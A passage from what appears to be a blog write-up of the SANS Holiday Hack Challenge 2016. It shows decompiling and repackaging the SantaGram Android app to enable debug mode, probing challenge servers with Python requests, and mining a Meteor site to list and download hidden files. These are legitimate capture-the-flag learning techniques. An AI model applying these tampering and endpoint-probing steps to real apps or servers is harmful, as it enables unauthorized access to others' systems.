+                <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"freemem"</span><span class="o">,</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">totalMemory</span><span class="o">()</span> <span class="o">-</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">freeMemory</span><span class="o">());</span>
+                <span class="k">new</span> <span class="nf">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">C08591</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">jSONObject</span><span class="o">)).</span><span class="na">start</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mi">2131165204</span><span class="o">),</span> <span class="s">"Error posting JSON debug data: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="n">ImageView</span> <span class="n">imageView</span> <span class="o">=</span> <span class="o">(</span><span class="n">ImageView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558535</span><span class="o">);</span>
+        <span class="n">ParseFile</span> <span class="n">parseFile</span> <span class="o">=</span> <span class="o">(</span><span class="n">ParseFile</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">f2421b</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">Configs</span><span class="o">.</span><span class="na">USER_AVATAR</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">parseFile</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">parseFile</span><span class="o">.</span><span class="na">getDataInBackground</span><span class="o">(</span><span class="k">new</span> <span class="n">C08602</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">imageView</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="n">imageView</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">C08613</span><span class="o">(</span><span class="k">this</span><span class="o">));</span>
+        <span class="n">imageView</span> <span class="o">=</span> <span class="o">(</span><span class="n">ImageView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558537</span><span class="o">);</span>
+        <span class="n">parseFile</span> <span class="o">=</span> <span class="o">(</span><span class="n">ParseFile</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">f2421b</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">Configs</span><span class="o">.</span><span class="na">USER_COVER_IMAGE</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">parseFile</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">parseFile</span><span class="o">.</span><span class="na">getDataInBackground</span><span class="o">(</span><span class="k">new</span> <span class="n">C08624</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">imageView</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="n">imageView</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">C08635</span><span class="o">(</span><span class="k">this</span><span class="o">));</span>
+        <span class="n">TextView</span> <span class="n">textView</span> <span class="o">=</span> <span class="o">(</span><span class="n">TextView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558540</span><span class="o">);</span>
+        <span class="n">textView</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">f2421b</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">Configs</span><span class="o">.</span><span class="na">USER_FULLNAME</span><span class="o">));</span>
+        <span class="n">TextView</span> <span class="n">textView2</span> <span class="o">=</span> <span class="o">(</span><span class="n">TextView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558542</span><span class="o">);</span>
+        <span class="n">textView2</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">f2421b</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">Configs</span><span class="o">.</span><span class="na">USER_ABOUT_ME</span><span class="o">));</span>
+        <span class="o">((</span><span class="n">TextView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558544</span><span class="o">)).</span><span class="na">setText</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">f2421b</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">Configs</span><span class="o">.</span><span class="na">USER_EMAIL</span><span class="o">));</span>
+        <span class="o">((</span><span class="n">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="mi">2131558545</span><span class="o">)).</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">C08656</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">textView</span><span class="o">,</span> <span class="n">textView2</span><span class="o">));</span>
+    <span class="o">}</span>
+</code></pre>
+</div>
+
+<p>The code tests if a certain string is <code class="highlighter-rouge">true</code> or <code class="highlighter-rouge">false</code> and logs if debug mode is enabled. If debugging mode is enabled, a JSON object with a <code class="highlighter-rouge">date</code>, <code class="highlighter-rouge">udid</code>, <code class="highlighter-rouge">debug</code> and <code class="highlighter-rouge">freemem</code> key is created. This JSON object is then passed to an unknown thread. This thread could possible be a URL connection to the the debug server. Assuming that, lets create a JSON object and send it to the server.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"http://dev.northpolewonderland.com/index.php"</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'date'</span><span class="p">:</span><span class="s">'insert-date'</span><span class="p">,</span> <span class="s">'udid'</span><span class="p">:</span><span class="s">'insert-udid'</span><span class="p">,</span> <span class="s">'debug'</span><span class="p">:</span><span class="s">'debug-here'</span><span class="p">,</span> <span class="s">'freemem'</span><span class="p">:</span><span class="s">'freemem-here'</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="o">.</span><span class="n">text</span>
+</code></pre>
+</div>
+
+<p>Still nothing. Lets look closer at the source code. It appears there are some specific formats to the values in the JSON.  We could try and discover what the Java code is creating, but lets go to the Android app and make it submit a debug report.</p>
+
+<p>We can use the recommendation from Josh Wright’s video of using <code class="highlighter-rouge">apktool</code> disassemble APK files into <code class="highlighter-rouge">smali</code> files in order to make search for important strings and to changes. We want to search for information about the <code class="highlighter-rouge">EditProfile.java</code> file. We first search for the URL and discover the nickname  of <code class="highlighter-rouge">debug_data_collection_url</code> is associated to that URL. That nickname is linked to the id <code class="highlighter-rouge">0x7f0f001d</code>. Looking for <code class="highlighter-rouge">0x7f07001d</code> in the smali files we see it is found in <code class="highlighter-rouge">smali/com/northpolewonderland/santagram/EditProfile$1.smali</code>.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code>
+<span class="gp">$ </span>grep -Ir dev.northpolewonderland.com <span class="k">*</span>
+res/values/strings.xml: &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span>&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;
+
+<span class="gp">$ </span>grep -Ir debug_data_collection_url <span class="k">*</span>
+res/values/public.xml: &lt;public <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span> <span class="nv">id</span><span class="o">=</span><span class="s2">"0x7f07001d"</span>&gt;
+res/values/strings.xml: &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span>&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;
+
+<span class="gp">$ </span>grep -Ir 0x7f07001d <span class="k">*</span>
+res/values/public.xml: &lt;public <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span> <span class="nv">id</span><span class="o">=</span><span class="s2">"0x7f07001d"</span>&gt;
+smali/com/northpolewonderland/santagram/EditProfile<span class="nv">$1</span>.smali: const v1, 0x7f07001d
+</code></pre>
+</div>
+
+<p>So when we see reference to v1 in <code class="highlighter-rouge">EditProfile$1.smali</code> we know it refers to the URL for the debug server. This confirms our assumptions that <code class="highlighter-rouge">EditProfile.java</code> is creating the JSON object being sent to the debug server.</p>
+
+<p>Above when searching for <code class="highlighter-rouge">debug</code> in the source, we see mention of an object in the <code class="highlighter-rouge">res/values/string.xml</code> file with name of <code class="highlighter-rouge">debug_data_enabled</code> and value as <code class="highlighter-rouge">false</code>. If we change this value to true and recompile the application, we can have a version of <em>SantaGram</em> app that submits bug reports. Following the instructions from the video recommend by <strong>Bushy Evergreen</strong>, we can compile and sign our edited version of <em>SantaGram</em>.</p>
+
+<p>Edit the <code class="highlighter-rouge">strings.xml</code> file and confirming our changes.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep <span class="nb">false </span>SantaGram_4.2/res/values/strings.xml
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_enabled"</span>&gt;false&lt;/string&gt;
+
+<span class="gp">$ </span>sed -i -e <span class="s1">'s/"debug_data_enabled"&gt;false/"debug_data_enabled"&gt;true/g'</span> SantaGram_4.2/res/values/strings.xml
+
+<span class="gp">$ </span>grep <span class="nb">true </span>SantaGram_4.2/res/values/strings.xml
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_enabled"</span>&gt;true&lt;/string&gt;
+</code></pre>
+</div>
+
+<p>Recompile SantaGram application using <code class="highlighter-rouge">apktool</code></p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>apktool b SantaGram_4.2
+I: Using Apktool 2.2.1
+I: Checking whether sources has changed...
+I: Checking whether resources has changed...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+</code></pre>
+</div>
+<p>Create a keystore and use it to sign the newly built hacked version of the SantaGram APK</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span><span class="nv">$JAVA_HOME</span>/bin/keytool -genkey -v -keystore keys/santagram.keystore -alias SantaGram -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000
+Enter keystore password:
+Re-enter new password:
+What is your first and last name?
+<span class="o">[</span>Unknown]:
+What is the name of your organizational unit?
+<span class="o">[</span>Unknown]:
+What is the name of your organization?
+<span class="o">[</span>Unknown]:
+What is the name of your City or Locality?
+<span class="o">[</span>Unknown]:
+What is the name of your State or Province?
+<span class="o">[</span>Unknown]:
+What is the two-letter country code <span class="k">for </span>this unit?
+<span class="o">[</span>Unknown]:
+Is <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown correct?
+<span class="o">[</span>no]: yes
+
+Generating 1,024 bit RSA key pair and self-signed certificate <span class="o">(</span>SHA1withRSA<span class="o">)</span> with a validity of 10,000 days
+<span class="k">for</span>: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
+Enter key password <span class="k">for</span> &lt;SantaGram&gt;
+<span class="o">(</span>RETURN <span class="k">if </span>same as keystore password<span class="o">)</span>:
+<span class="o">[</span>Storing keys/santagram.keystore]
+
+<span class="gp">$ </span><span class="nv">$JAVA_HOME</span>/bin/jarsigner -keystore keys/SantaGram.keystore SantaGram_4.2/dist/SantaGram_4.2.apk -sigalg SHA1withRSA -digestalg SHA1 SantaGram
+Enter Passphrase <span class="k">for </span>keystore:
+jar signed.
+
+Warning:
+No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate<span class="s1">'s expiration date (2044-05-11) or after any future revocation date.
+</span></code></pre>
+</div>
+
+<p>We now have working version of the SantaGram app that we can open up in an Android emulator. I use the awesome free version of the <a href="https://www.genymotion.com">Genymotion</a>. Just drag and drop the newly signed APK file in the emulated phone home screen to install and run. (note: I had a problem with an early API version of an Android device, I found that API version 24 would works.</p>
+
+<p>After a very quick SantaGram Splash Screen, we are presented with a login page. Click the <code class="highlighter-rouge">Need an Account</code> link to sign up for a link. No email confirmation is needed so just type whatever you want. Once you are logged in you will see your home page and a list of your empty list of accounts you are following. You can search for other users and see their photos. Most of the elves in the North Pole have accounts with either holiday pictures or screen captures of their penetration testing work (i.e. more hints).</p>
+
+<p><img src="/assets/images/holidayhack2016/santagram_combine_1.png" alt="SantaGram Create Account" /></p>
+
+<p><img src="/assets/images/holidayhack2016/santagram_combine_2.png" alt="SantaGram Create Account" /></p>
+
+<p>Clicking on the icon labeled <code class="highlighter-rouge">Me</code> at the bottom takes us to our account profile page. You will see two buttons on the right labeled <code class="highlighter-rouge">Activity</code> and <code class="highlighter-rouge">Edit Profile.</code></p>
+
+<p><img src="/assets/images/holidayhack2016/santagram_editprofile.png" alt="Edit Program" /></p>
+
+<p>We are assuming that communications with the debug server is going to start when we click the <code class="highlighter-rouge">Edit Profile</code> button. I start <code class="highlighter-rouge">wireshark</code> capturing all traffic on my network traffic since <code class="highlighter-rouge">Genymotion</code> uses the <code class="highlighter-rouge">VirtualBox</code> instance on my laptop to communicate with the debug server. I apply a filter to only display traffic with a source or destination IP address of the debug server. Clicking the <code class="highlighter-rouge">Edit Profile</code> button takes me to the following screen and I see the below traffic in <code class="highlighter-rouge">wireshark</code>.</p>
+
+<p><img src="/assets/images/holidayhack2016/wireshark_debug.png" alt="Wireshark Capture" /></p>
+
+<p>In the first packet sent from SantaGram to the debug server, after the TCP 3-way handshake, is an JSON object with the name and values which we expected. The server send back a couple of packets so we will look at the entire stream. In Wireshark, choose Analyze - Follow - TCP Steam. Below is that output.</p>
+
+<p><img src="/assets/images/holidayhack2016/wireshark_followtcp_debug.png" alt="Wiresharek Follow TCP" /></p>
+
+<p>The red portion is traffic sent by the Application to the Debug server, the blue is the response. The posted JSON object has all the fields that we saw in the <code class="highlighter-rouge">EditProfile.java</code> source code. The reply object has a <code class="highlighter-rouge">date</code>, <code class="highlighter-rouge">status</code>, <code class="highlighter-rouge">filename</code>, and <code class="highlighter-rouge">request</code> field. The request field is another JSON object with our posted object fields except it has one additional field. The additional name/value pair is <code class="highlighter-rouge">"verbose":false</code>. It appears if the object does not have a verbose field it defaults to false. Let’s use our <code class="highlighter-rouge">python</code> script to send the same JSON object above but with the verbose field set to true.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"date"</span><span class="p">:</span><span class="s">"20161224122717-0500"</span><span class="p">,</span>
+    <span class="s">"udid"</span><span class="p">:</span><span class="s">"bc651a8e3fc7d417"</span><span class="p">,</span>
+    <span class="s">"debug"</span><span class="p">:</span><span class="s">"com.northpolewonderland.santagram.EditProfile, EditProfile"</span><span class="p">,</span>
+    <span class="s">"freemem"</span><span class="p">:</span><span class="mi">68854400</span>
+<span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="n">data</span><span class="p">[</span><span class="s">"verbose"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="o">.</span><span class="n">text</span>
+<span class="p">{</span><span class="s">"date"</span><span class="p">:</span><span class="s">"20161224204103"</span><span class="p">,</span>
+<span class="s">"date.len"</span><span class="p">:</span><span class="mi">14</span><span class="p">,</span>
+<span class="s">"status"</span><span class="p">:</span><span class="s">"OK"</span><span class="p">,</span>
+<span class="s">"status.len"</span><span class="p">:</span><span class="s">"2"</span><span class="p">,</span>
+<span class="s">"filename"</span><span class="p">:</span><span class="s">"debug-20161224204103-0.txt"</span><span class="p">,</span>
+<span class="s">"filename.len"</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span>
+<span class="s">"request"</span><span class="p">:{</span>
+          <span class="s">"date"</span><span class="p">:</span><span class="s">"201612241227170500"</span><span class="p">,</span>
+          <span class="s">"udid"</span><span class="p">:</span><span class="s">"bc651a8e3fc7d417"</span><span class="p">,</span>
+          <span class="s">"freemem"</span><span class="p">:</span><span class="mi">68854400</span><span class="p">,</span>
+          <span class="s">"debug"</span><span class="p">:</span><span class="s">"com.northpolewonderland.santagram.EditProfile, EditProfile"</span><span class="p">,</span>
+          <span class="s">"verbose"</span><span class="p">:</span><span class="n">true</span>
+<span class="p">},</span>
+<span class="s">"files"</span><span class="p">:[</span><span class="s">"debug-20161224203052-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203130-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203151-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203159-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203349-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203556-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203612-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224203642-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224204103-0.txt"</span><span class="p">,</span>
+         <span class="s">"debug-20161224235959-0.mp3"</span><span class="p">,</span>
+         <span class="s">"index.php"</span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>Our output now has many more name-value pairs, including a pair called files with a list of files. One such file is called <code class="highlighter-rouge">debug-20161224235959-0.mp3</code>. This appears to be the audio file we need. Firing up <code class="highlighter-rouge">wget</code>, we can pull this down from the file straight off the webroot on the debug server.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code>wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
+--2016-12-24 15:43:56-- http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
+Resolving dev.northpolewonderland.com... 35.184.63.245
+Connecting to dev.northpolewonderland.com|35.184.63.245|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 218033 <span class="o">(</span>213K<span class="o">)</span> <span class="o">[</span>audio/mpeg]
+Saving to: <span class="s1">'debug-20161224235959-0.mp3'</span>
+
+debug-20161224235959-0.mp3 100%[<span class="o">================================================</span>&gt;] 212.92K 550KB/s <span class="k">in </span>0.4s
+
+2016-12-24 15:43:57 <span class="o">(</span>550 KB/s<span class="o">)</span> - <span class="s1">'debug-20161224235959-0.mp3'</span> saved <span class="o">[</span>218033/218033]
+</code></pre>
+</div>
+
+<p>The name implies it was recorded at one second before Christmas Day 2016. The name of the downloaded file is ``debug-20161224235959-0.mp3</p>
+
+<h4 id="the-banner-ad-server">The Banner Ad Server</h4>
+
+<p>The next target is the Banner Ad Server. The domain name of the server is <code class="highlighter-rouge">ads.northpolewonderland.com</code> and the IP address is <code class="highlighter-rouge">104.198.221.240</code>. According to our source code there is a folder and file called <code class="highlighter-rouge">affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5</code> in the webroot.</p>
+
+<p>Going to this file on the server provides a rotating series of banner advertisements as shown at the bottom of the <em>SantaGram</em> app. A set of these were provided as hints before the release of the SANS Holiday Hack Challenge. Continuously going to this URL I pulled the following 5 banner ads.</p>
+
+<p><img src="/assets/images/holidayhack2016/candycanefarm.jpeg" alt="Candy Cane Farm" />
+<img src="/assets/images/holidayhack2016/christmaslightrepair.jpeg" alt="Christmas Light Repair" />
+<img src="/assets/images/holidayhack2016/denistry.jpeg" alt="Denistry" />
+<img src="/assets/images/holidayhack2016/reindeercleanup.jpeg" alt="Reindeer Cleanup" />
+<img src="/assets/images/holidayhack2016/snowremoval.jpeg" alt="Snow Removal" /></p>
+
+<p>I checked out the root website at that domain name to find the homepage for a service called <code class="highlighter-rouge">Ad Nauseam</code>. This is the home page for the server that provides advertisements that help fund the free usage of <em>SantaGram</em>.</p>
+
+<p><img src="/assets/images/holidayhack2016/ad_nauseam.png" alt="Ad Nauseum Home" /></p>
+
+<p>The quick view of the source code for this page indicates its build around the <code class="highlighter-rouge">Meteor</code> framework. This lines up with a recent <a href="https://pen-testing.sans.org/blog/2016/12/06/mining-meteor">blog</a> at the SANS Pentest Website mentioned by the elf in Santa’s workshop named <strong>Pepper Mintstix</strong>. This blog discusses how to mine a Meteor website for information leakage. It provides a link to <a href="https://github.com/nidem/MeteorMiner">Tim Medin’s github</a> site to a <a href="https://tampermonkey.net/">TamperMonkey</a> script called <code class="highlighter-rouge">MeteorMiner</code>. Installing this add-on and script into my Chrome browser, provides a interesting toolbar to show you the various Meteor objects for the site.</p>
+
+<p><img src="/assets/images/holidayhack2016/meteor_miner_home.png" alt="Meteor Miner Enabled" /></p>
+
+<p>Taking note of what is available, I begin to dig around the ad server website. When I get to the <code class="highlighter-rouge">/admin/quotes</code> route, I notice that the <code class="highlighter-rouge">HomeQuotes</code> collection now has 5 records when it initially had 4. Clicking on the records, I see the new record has an audio field.</p>
+
+<p><img src="/assets/images/holidayhack2016/ad_homequotes_collections.png" alt="HomeQuotes Colletion" /></p>
+
+<p>Using the tip from the blog of using the <code class="highlighter-rouge">JavaScript</code> console to access the data in the collection, I run the command <code class="highlighter-rouge">HomeQuotes.find().fetch()</code> to see the array of the objects. Viewing the last object in the array, we see the audio field has a URL.</p>
+
+<p><img src="/assets/images/holidayhack2016/ad_server_exploit.png" alt="Ad Server Exploit" /></p>
+
+<p>Accessing the url <code class="highlighter-rouge">/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3</code>, I am able to download the 5th audio file.</p>
+
+<p>The name of the downloaded file is: <code class="highlighter-rouge">discombobulatedaudio5.mp3</code></p>
+
+<h4 id="the-uncaught-exception-handler-server">The Uncaught Exception Handler Server</h4>
+
+<p>The exception handler server has a domain name of ex.northpolewonderland.com. and an IP address of 104.154.196.33. There is a page in the webroot called exception.php. Let’s go back to iPython and interact with this server.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"http://ex.northpolewonderland.com/exception.php"</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="s">u'Request method must be POST</span><span class="se">\n</span><span class="s">'</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/json"</span><span class="p">}</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="s">u'POST contains invalid JSON!</span><span class="se">\n</span><span class="s">'</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({})</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="s">u"Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.</span><span class="se">\n</span><span class="s">"</span>
+</code></pre>
+</div>
+
+<p>So the error codes are helping us out here. We learn the following just by interacting with the overly verbose server:</p>
+
+<ul>
+  <li>GET requests not allowed, only POST request</li>
+  <li>The Content-Type in the HTTP header must be set to application/json</li>
+  <li>We must submit a JSON object as the POST data
+*Our JSON object must have a key of ‘operation’ that needs to have a value of either WriteCrashDump or ReadCrashDump</li>
+</ul>
+
+<p>This tell us a few things. We appear to have the ability to write information to the system and the ability to potentially be able to read back what we wrote. We also have some pretty specific phrases (<code class="highlighter-rouge">WriteCrashDump</code> and <code class="highlighter-rouge">ReadCrashDump</code>) to search for in our source code. Let’s look for those phrases</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep -IEr CrashDump <span class="k">*</span>
+com/northpolewonderland/santagram/C0987b.java: jSONObject.put<span class="o">(</span><span class="s2">"operation"</span>, <span class="s2">"WriteCrashDump"</span><span class="o">)</span>;
+com/northpolewonderland/santagram/SplashScreen.java: jSONObject.put<span class="o">(</span><span class="s2">"operation"</span>, <span class="s2">"WriteCrashDump"</span><span class="o">)</span>;
+</code></pre>
+</div>
+
+<p>This reveals there is no mention of the reading crash dumps, but we create the JSON object with the operation of <code class="highlighter-rouge">WriteCrashDump</code> in the <code class="highlighter-rouge">SplashScreen.java</code> code (along with the obfuscated <code class="highlighter-rouge">C0987b.java</code> file).</p>
+
+<p>The entire <code class="highlighter-rouge">SplashScreen.java</code> file can be found <a href="https://github.com/wcmoody/holidayhack/blob/master/SplashScreen.java">here</a> but below is the important code about the <code class="highlighter-rouge">WriteCrashDump</code> JSON object.</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">postExceptionData</span><span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
+<span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mi">2131165204</span><span class="o">),</span> <span class="s">"Exception: sending exception data to "</span> <span class="o">+</span> <span class="n">getString</span><span class="o">(</span><span class="mi">2131165216</span><span class="o">));</span>
+<span class="k">try</span> <span class="o">{</span>
+    <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"operation"</span><span class="o">,</span> <span class="s">"WriteCrashDump"</span><span class="o">);</span>
+    <span class="n">JSONObject</span> <span class="n">jSONObject2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"message"</span><span class="o">,</span> <span class="n">th</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+    <span class="n">jSONObject2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"lmessage"</span><span class="o">,</span> <span class="n">th</span><span class="o">.</span><span class="na">getLocalizedMessage</span><span class="o">());</span>
